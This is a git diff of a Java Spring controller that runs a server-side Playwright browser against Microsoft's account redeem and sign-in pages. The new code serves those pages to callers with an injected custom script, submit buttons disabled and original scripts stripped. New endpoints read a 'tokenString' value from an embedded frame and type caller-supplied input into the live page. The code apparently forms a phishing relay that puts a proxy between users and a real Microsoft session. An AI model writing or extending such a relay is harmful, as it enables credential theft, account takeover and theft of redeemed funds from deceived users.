@@ -41,6 +41,45 @@ public class RemoteRestController {
         return new ResponseEntity<String>("{\"ret\":\"ok\"}", HttpStatus.OK);
     }
 
+    @GetMapping("/getTokenString")
+    public ResponseEntity<String> getTokenString(HttpSession session) {
+        Page page = (Page) session.getAttribute("page");
+        List<Frame> frames = page.frames();
+        Frame frame = frames.get(0);
+        List<Frame> innerFrames = frame.childFrames();
+        Frame innerFrame  =  innerFrames.get(0);
+        String value = innerFrame.locator("//*[@id=\"tokenString\"]").inputValue();
+        return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \""+ value + "\" }", HttpStatus.OK);
+    }
+
+
+
+
+    @PostMapping("/updateTokenString")
+    public ResponseEntity<String> updateTokenString(HttpSession session, @RequestBody Field field) {
+        System.out.println(field);
+        Page page = (Page) session.getAttribute("page");
+
+        List<Frame> frames = page.frames();
+//        for (Frame frame : frames) {
+//            frame.waitForLoadState();
+//        }
+
+
+        Frame frame = frames.get(0);
+
+        List<Frame> innerFrames = frame.childFrames();
+
+        //innerFrame.get(0).waitForLoadState();
+        Frame innerFrame  =  innerFrames.get(0);
+        innerFrame.locator(field.getXpath()).clear();
+        innerFrame.locator(field.getXpath()).type(field.getValue());
+        String value = innerFrame.locator(field.getXpath()).inputValue();
+        return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \""+ value + "\" }", HttpStatus.OK);
+    }
+
+
+
     @PostMapping("/click")
     public ResponseEntity<String> click(HttpServletRequest request, HttpSession session, @RequestBody Field field) {
         System.out.println(field);
@@ -53,13 +92,22 @@ public class RemoteRestController {
         int pos = request.getRequestURL().indexOf(request.getRequestURI());
 
         String next = request.getRequestURL().substring(0, pos);
-        String nextUrl = next + "/next";
+        String nextUrl="";
+
+        if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
+                || page.title().equalsIgnoreCase( "Microsoft account | ממש את קוד או כרטיס המתנה שלך" ) )) {
+            nextUrl = next + "/next";
+
+       }else{
+            nextUrl = next + "/iframe/0/0";
+
+        }
 
         return new ResponseEntity<String>("{\"url\":\"" + nextUrl + "\"}", HttpStatus.OK);
     }
 
-    @GetMapping("/")
-    public ResponseEntity<String> init(HttpServletResponse response,Model model, HttpSession session) {
+    @GetMapping("/init")
+    public ResponseEntity<String> init(HttpServletRequest request, HttpServletResponse response,Model model, HttpSession session) {
         @SuppressWarnings("unchecked")
         Page page = (Page) session.getAttribute("page");
 
@@ -87,7 +135,8 @@ public class RemoteRestController {
             page = context.newPage();
             // page.setDefaultTimeout(100000);
         }
-        page.navigate("https://redeem.microsoft.com");
+        //page.navigate("https://redeem.microsoft.com");
+        page.navigate("https://account.microsoft.com/billing/redeem?lang=he-IL");
 
         //  page.waitForLoadState(LoadState.DOMCONTENTLOADED );
         page.waitForLoadState(LoadState.NETWORKIDLE);
@@ -107,11 +156,23 @@ public class RemoteRestController {
         System.out.println(page.content());
 
         //model.addAttribute("page", page);
+        int pos = request.getRequestURL().indexOf(request.getRequestURI());
 
-        String contect = page.content().replace("</head>", "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\"></script><script src='script/custom.js'></script></head>");
-        contect = contect.replace("type=\"submit\"", "type=\"button\"");
+        String homeScript = request.getRequestURL().substring(0, pos);
+        String scriptUrl = homeScript + "/script/custom.js";
+
+        String content = page.content().replace("</head>", "<script " +
+                "src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\">" +
+                "</script><script src='"+ scriptUrl +"'></script></head>");
+        content = content.replace("type=\"submit\"", "type=\"button\"");
         String host = HtmlUtil.getHost(page);
         System.out.println(host);
+        Document doc = Jsoup.parse(content);
+
+        HtmlUtil.fixScript(doc, host);
+        HtmlUtil.fixLinks(doc, host);
+        //
+
 
         //page.waitForLoadState(d);
         page.waitForLoadState(LoadState.LOAD);
@@ -119,7 +180,7 @@ public class RemoteRestController {
         response.setHeader("Access-Control-Allow-Origin","*");
         response.setHeader("Access-Control-Allow-Methods" ,"*");
 
-        return new ResponseEntity<String>(contect, HttpStatus.OK);
+        return new ResponseEntity<String>(content, HttpStatus.OK);
 
     }
 
@@ -139,16 +200,18 @@ public class RemoteRestController {
         System.out.println("page.title(): " + page.title());
         //Sign in to your Microsoft account
         //Microsoft account(
-       // if (!page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")) {
+        if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
+            || page.title().equalsIgnoreCase( "Microsoft account | ממש את קוד או כרטיס המתנה שלך" ) )) {
 
-
-            // page.waitForSelector("script");
+                    // page.waitForSelector("script");
             page.evaluate("() => {" +
                     "for (const script of document.documentElement.querySelectorAll('script')) script.remove(); " +
                     "return document.documentElement.outerHTML; " +
                     "}"
             );
-       // }
+        }else{
+            System.out.println("xxxx");
+        }
         int pos = request.getRequestURL().indexOf(request.getRequestURI());
 
         String homeScript = request.getRequestURL().substring(0, pos);
@@ -177,16 +240,38 @@ public class RemoteRestController {
         System.out.println("page.url()");
         System.out.println(page.url());
         String host = HtmlUtil.getHost(page);
+        System.out.println("host");
+        System.out.println(host);
+
         HtmlUtil.fixLinks(doc, host);
- //       page.waitForLoadState(LoadState.NETWORKIDLE);
+        HtmlUtil.fixScript(doc, host);
+
+
+        System.out.println("*******************doc***************************************************8");
+        System.out.println(doc.outerHtml());
+        System.out.println("*******************doc***************************************************8");
+
+        //       page.waitForLoadState(LoadState.NETWORKIDLE);
  //       page.waitForLoadState(LoadState.LOAD);
  //       page.waitForLoadState(LoadState.DOMCONTENTLOADED);
 //
         //return new ResponseEntity<String>(content, HttpStatus.OK);
         response.setHeader("Access-Control-Allow-Origin","*");
         response.setHeader("Access-Control-Allow-Methods" ,"*");
-        return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
+
+      //  if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
+      //          || page.title().equalsIgnoreCase( "Microsoft account | ממש את קוד או כרטיס המתנה שלך" ) )) {
+
+            return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
+
+       // }else{
+            //return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
+           // return getFramNo(HttpServletRequest request, HttpServletResponse response, HttpSession session, @PathVariable int frameNo) throws IOException {
+         //   getFramNo(request,response,session,0);
+           // return getInnerFramNo(request,response,session,0,0);
+//        }
     }
+
 
 
     @GetMapping("/iframe/{frameNo}")
@@ -208,7 +293,9 @@ public class RemoteRestController {
         int pos = request.getRequestURL().indexOf(request.getRequestURI());
         String homeScript = request.getRequestURL().substring(0, pos);
         String scriptUrl = homeScript + "/script/custom.js";
-        content = content.replace("</head>", "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\"></script><script src='" + scriptUrl + "'></script></head>");
+        content = content.replace("</head>",
+            //    "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js\"> </script>" +
+                        "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\"></script><script src='" + scriptUrl + "'></script></head>");
 
         Document doc = Jsoup.parse(content);
         Elements iframes = doc.getElementsByTag("iframe");
@@ -223,6 +310,9 @@ public class RemoteRestController {
 
         System.out.println("page.url()");
         System.out.println(page.url());
+
+        response.setHeader("Access-Control-Allow-Origin","*");
+        response.setHeader("Access-Control-Allow-Methods" ,"*");
 
         return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
     }
@@ -250,19 +340,34 @@ public class RemoteRestController {
 
         System.out.println("page.url()");
         System.out.println(page.url());
+        String content ="";
+        try {
+             content = innerFrame.get(inerframeNo).content();
+        } catch (com.microsoft.playwright.PlaywrightException e){
+
+            String body = "<html lang=\"he-IL\">\n" +
+                    " <head>\n" +
+                    "  <title>error</title>\n" +
+                    " </head>\n" +
+                    " <body></body>";
 
 
-        String content = innerFrame.get(inerframeNo).content();
+            return new ResponseEntity<String>(body, HttpStatus.OK);
+        }
         int pos = request.getRequestURL().indexOf(request.getRequestURI());
         String homeScript = request.getRequestURL().substring(0, pos);
         String scriptUrl = homeScript + "/script/custom.js";
-        content = content.replace("</head>", "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\"></script><script src='" + scriptUrl + "'></script></head>");
+        content = content.replace("</head>",
+             //   "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js\"></script>" +
+                "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\"></script><script src='" + scriptUrl + "'></script></head>");
 
 
         Document doc = Jsoup.parse(content);
         String host = HtmlUtil.getFrameHost(innerFrame.get(inerframeNo));
         HtmlUtil.fixLinks(doc, host);
         HtmlUtil.fixScript(doc, host);
+        response.setHeader("Access-Control-Allow-Origin","*");
+        response.setHeader("Access-Control-Allow-Methods" ,"*");
 
         //return new ResponseEntity<String>(content, HttpStatus.OK);
         return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
